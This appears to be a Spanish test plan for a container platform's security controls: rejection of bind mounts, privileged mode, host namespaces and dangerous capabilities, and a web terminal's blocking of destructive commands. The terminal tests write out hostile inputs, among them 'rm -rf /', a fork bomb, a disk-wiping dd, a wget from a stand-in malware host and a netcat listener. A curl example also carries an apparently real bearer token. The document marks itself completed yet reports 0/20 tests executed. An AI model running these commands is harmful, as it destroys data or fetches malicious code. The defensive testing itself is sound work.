# Plan de Testing - Seguridad Crítica (Core)

**Fecha**: 18/01/2026  
**Tipo**: Testing de Seguridad - Parte 1 (Core)  
**Estado**: COMPLETADO ✅

---

## 📋 **ALCANCE DE ESTE DOCUMENTO**

Este documento cubre los tests de seguridad que **NO requieren API**:

- ✅ Volúmenes Docker
- ✅ Configuraciones Peligrosas en Compose
- ✅ Terminal Web

**Tests de API (Tokens JWT)** → Ver: `testing_seguridad_critica_api_20260118.md`

---

## 🧪 TESTING MEJORA 1: VOLÚMENES DOCKER

### **Test 1.1: Contenedores Simples - Sin Volúmenes**

**Objetivo**: Verificar que contenedores simples NO crean volúmenes automáticamente

**Pasos**:

1. Crear servicio simple con imagen nginx
2. Iniciar el servicio
3. Ejecutar: `docker inspect <container_id> | grep -A 10 "Mounts"`
4. **Verificar**:
   - [SI] NO hay volúmenes montados
   - [SI] Sección "Mounts" está vacía o solo tiene volúmenes anónimos de Docker
   - [SI] NO hay bind mounts

**Resultado Esperado**: ✅ Sin volúmenes

---

### **Test 1.2: API - Rechazar Campo Volumes**

**Objetivo**: Verificar que la API rechaza el campo `volumes`

**Pasos**:

1. Obtener token API
2. Ejecutar curl:

   ```bash
   curl --request POST \
     http://localhost:8000/api/containers/ \
     --header 'Authorization: Bearer 94d46052f03f7dc061ee500780c99bc1330b7b51' \
     --header 'Content-Type: application/json' \
     --data '{
       "name": "test-volumes",
       "image": "nginx:latest",
       "mode": "default",
       "volumes": {"/host/path": "/container/path"}
     }'

   ```

3. **Verificar**:
   - [SI] Status code: 400 Bad Request
   - [SI] Mensaje: "Por razones de seguridad, no se permiten volúmenes en contenedores simples"
   - [SI] Servicio NO se crea

**Resultado Esperado**: ✅ Campo volumes rechazado

---

### **Test 1.3: Docker Compose - Bind Mount Absoluto**

**Objetivo**: Verificar que se rechazan bind mounts con rutas absolutas

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      volumes:
        - /host/data:/app/data
  ```

**Pasos**:

1. Intentar crear servicio con este compose
2. **Verificar**:
   - [SI] Validación falla
   - [SI] Mensaje: "SEGURIDAD: Bind mounts no permitidos"
   - [SI] Indica el volumen rechazado: `/host/data:/app/data`
   - [SI] Servicio NO se crea

**Resultado Esperado**: ✅ Bind mount rechazado

---

### **Test 1.4: Docker Compose - Bind Mount Relativo**

**Objetivo**: Verificar que se rechazan bind mounts con rutas relativas

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      volumes:
        - ./data:/app/data
        - ../config:/app/config
  ```

**Pasos**:

1. Intentar crear servicio
2. **Verificar**:
   - [SI] Validación falla
   - [SI] Mensaje indica bind mount no permitido
   - [SI] Rechaza `./data:/app/data`

**Resultado Esperado**: ✅ Bind mounts relativos rechazados

---

### **Test 1.5: Docker Compose - Formato Largo con type: bind**

**Objetivo**: Verificar que se rechaza formato largo con type: bind

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      volumes:
        - type: bind
          source: /host/path
          target: /container/path
  ```

**Pasos**:

1. Intentar crear servicio
2. **Verificar**:
   - [SI] Validación falla
   - [SI] Mensaje: "Bind mounts no permitidos"
   - [SI] Indica que solo se permite `type: volume`

**Resultado Esperado**: ✅ Type bind rechazado

---

### **Test 1.6: Docker Compose - Volumen Nombrado (PERMITIDO)**

**Objetivo**: Verificar que volúmenes nombrados SÍ se permiten

**Preparación**:

- Crear `docker-compose.yml`:

  ```yaml
  services:
    web:
      image: nginx:latest
      volumes:
        - mi_volumen:/app/data
        - otro_volumen:/app/config

  volumes:
    mi_volumen:
    otro_volumen:
  ```

**Pasos**:

1. Crear servicio con este compose
2. **Verificar**:
   - [Si] Validación pasa ✅
   - [Si] Servicio se crea correctamente
   - [Si] Volúmenes nombrados se crean en Docker
3. Ejecutar: `docker volume ls | grep mi_volumen`
4. **Verificar**:
   - [Si] Volúmenes existen
   - [Si] Son volúmenes de Docker (no bind mounts)

**Resultado Esperado**: ✅ Volúmenes nombrados permitidos

---

## 📋 TESTING MEJORA 2: CONFIGURACIONES PELIGROSAS

### **Test 2.1: Privileged Mode**

**Objetivo**: Verificar que se rechaza `privileged: true`

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      privileged: true
  ```

**Pasos**:

1. Intentar crear servicio
2. **Verificar**:
   - [Si] Validación falla ✅
   - [Si] Mensaje: "Modo privilegiado no permitido (escalada de privilegios)"
   - [Si] Servicio NO se crea ✅

**Resultado Esperado**: ✅ Privileged mode rechazado

---

### **Test 2.2: Network Mode Host**

**Objetivo**: Verificar que se rechaza `network_mode: host`

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      network_mode: host
  ```

**Pasos**:

1. Intentar crear servicio
2. **Verificar**:
   - [Si] Validación falla ✅
   - [Si] Mensaje: "Network mode host no permitido (acceso a red del host)"
   - [Si] Servicio NO se crea ✅

**Resultado Esperado**: ✅ Network mode host rechazado

---

### **Test 2.3: PID Mode Host**

**Objetivo**: Verificar que se rechaza `pid: host`

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      pid: host
  ```

**Pasos**:

1. Intentar crear servicio
2. **Verificar**:
   - [Si] Validación falla ✅
   - [Si] Mensaje: "PID mode host no permitido (acceso a procesos del host)"
   - [Si] Servicio NO se crea ✅

**Resultado Esperado**: ✅ PID mode host rechazado

---

### **Test 2.4: IPC Mode Host**

**Objetivo**: Verificar que se rechaza `ipc: host`

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      ipc: host
  ```

**Pasos**:

1. Intentar crear servicio
2. **Verificar**:
   - [Si] Validación falla ✅
   - [Si] Mensaje: "IPC mode host no permitido"
   - [Si] Servicio NO se crea ✅

**Resultado Esperado**: ✅ IPC mode host rechazado

---

### **Test 2.5: Capabilities Peligrosas - SYS_ADMIN**

**Objetivo**: Verificar que se rechazan capabilities peligrosas

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      cap_add:
        - SYS_ADMIN
        - NET_ADMIN
  ```

**Pasos**:

1. Intentar crear servicio
2. **Verificar**:
   - [Si] Validación falla ✅
   - [Si] Mensaje indica capability peligrosa ✅
   - [Si] Lista capabilities no permitidas ✅

**Resultado Esperado**: ✅ Capabilities peligrosas rechazadas

---

### **Test 2.6: Devices**

**Objetivo**: Verificar que se rechaza montaje de dispositivos

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      devices:
        - /dev/sda:/dev/sda
  ```

**Pasos**:

1. Intentar crear servicio
2. **Verificar**:
   - [Si] Validación falla ✅
   - [Si] Mensaje: "Acceso a dispositivos no permitido" ✅
   - [Si] Servicio NO se crea ✅

**Resultado Esperado**: ✅ Devices rechazados

---

### **Test 2.7: Compose Seguro (PERMITIDO)**

**Objetivo**: Verificar que compose sin configuraciones peligrosas se permite

**Preparación**:

- Crear `docker-compose.yml`:
  ```yaml
  services:
    web:
      image: nginx:latest
      ports:
        - "8080:80"
      environment:
        - ENV=production
    redis:
      image: redis:7-alpine
      ports:
        - "6379:6379"
  ```

**Pasos**:

1. Crear servicio
2. **Verificar**:
   - [Si] Validación pasa ✅
   - [Si] Servicio se crea ✅
   - [Si] Ambos contenedores inician ✅

**Resultado Esperado**: ✅ Compose seguro permitido

---

## 📋 TESTING MEJORA 4: TERMINAL WEB

### **Test 4.1: Comando Normal (PERMITIDO)**

**Objetivo**: Verificar que comandos normales funcionan

**Pasos**:

1. Crear y iniciar servicio
2. Abrir terminal web
3. Ejecutar comandos normales:
   - `ls -la`
   - `pwd`
   - `echo "test"`
   - `cat /etc/os-release`
4. **Verificar**:
   - [Si] Comandos se ejecutan normalmente ✅
   - [Si] Output se muestra correctamente ✅
   - [Si] Sin mensajes de bloqueo ✅

**Resultado Esperado**: ✅ Comandos normales funcionan

---

### **Test 4.2: rm -rf / (BLOQUEADO)**

**Objetivo**: Verificar que `rm -rf /` es bloqueado

**Pasos**:

1. Abrir terminal web
2. Intentar ejecutar: `rm -rf /`
3. **Verificar**:
   - [Si] Comando NO se ejecuta
   - [Si] Mensaje: "[SEGURIDAD] Comando bloqueado: 'rm -rf /' no permitido"
   - [Si] Mensaje: "Este comando ha sido registrado"
   - [Si] Sistema de archivos intacto

**Resultado Esperado**: ✅ Comando bloqueado

---

### **Test 4.3: Fork Bomb (BLOQUEADO)**

**Objetivo**: Verificar que fork bomb es bloqueada

**Pasos**:

1. Abrir terminal web
2. Intentar ejecutar: `:(){ :|:& };:`
3. **Verificar**:
   - [Si] Comando bloqueado
   - [Si] Mensaje de seguridad mostrado
   - [Si] Sistema NO se cuelga

**Resultado Esperado**: ✅ Fork bomb bloqueada

---

### **Test 4.4: dd if=/dev/zero (BLOQUEADO)**

**Objetivo**: Verificar que dd destructivo es bloqueado

**Pasos**:

1. Abrir terminal web
2. Intentar ejecutar: `dd if=/dev/zero of=/dev/sda`
3. **Verificar**:
   - [Si] Comando bloqueado
   - [Si] Mensaje de seguridad
   - [Si] Disco NO afectado

**Resultado Esperado**: ✅ dd bloqueado

---

### **Test 4.5: wget/curl HTTP (BLOQUEADO)**

**Objetivo**: Verificar que descarga de archivos externos es bloqueada

**Pasos**:

1. Abrir terminal web
2. Intentar ejecutar: `wget http://malware.com/script.sh`
3. **Verificar**:
   - [Si] Comando bloqueado
   - [Si] Mensaje de seguridad
   - [Si] Descarga NO ocurre

**Resultado Esperado**: ✅ wget/curl bloqueados

---

### **Test 4.6: Netcat Listener (BLOQUEADO)**

**Objetivo**: Verificar que netcat listener es bloqueado

**Pasos**:

1. Abrir terminal web
2. Intentar ejecutar: `nc -l 4444`
3. **Verificar**:
   - [Si] Comando bloqueado
   - [Si] Mensaje de seguridad
   - [Si] Listener NO se crea

**Resultado Esperado**: ✅ Netcat bloqueado

---

### **Test 4.7: Logging de Intentos Maliciosos**

**Objetivo**: Verificar que intentos bloqueados se registran en logs

**Pasos**:

1. Intentar ejecutar varios comandos bloqueados
2. Revisar logs de Django
3. **Verificar**:
   - [Si] Logs contienen entradas de seguridad
   - [Si] Formato: "SEGURIDAD: Comando peligroso bloqueado en terminal"
   - [Si] Incluye usuario
   - [Si] Incluye patrón bloqueado

**Resultado Esperado**: ✅ Intentos registrados en logs

---

## 📊 RESUMEN DE TESTING

### **Total de Tests en este documento**: 20

**Por Mejora:**

- Mejora 1 (Volúmenes): 6 tests
- Mejora 2 (Compose): 7 tests
- Mejora 4 (Terminal): 7 tests

**Estado:**

- Tests ejecutados: 0/20
- Tests pasados: 0/20
- Tests fallidos: 0/20

---

## 🎯 CRITERIOS DE ACEPTACIÓN

### **Seguridad:**

- [Si] Todos los tests de volúmenes pasados
- [Si] Todos los tests de compose pasados
- [Si] Todos los tests de terminal pasados
- [Si] Sin vulnerabilidades detectadas

### **Funcionalidad:**

- [Si] Uso legítimo NO afectado
- [Si] Mensajes de error claros
- [Si] Performance aceptable
- [Si] Logging funcional

---

## 🚀 PRÓXIMOS PASOS

1. **Completar estos 20 tests**
2. **Documentar resultados**
3. **Continuar con tests de API** (ver `testing_seguridad_critica_api_20260118.md`)
4. **Merge a develop** cuando todo pase

---

**Última actualización**: 2026-01-18 21:17  
**Próximo paso**: Ejecutar Test 1.1
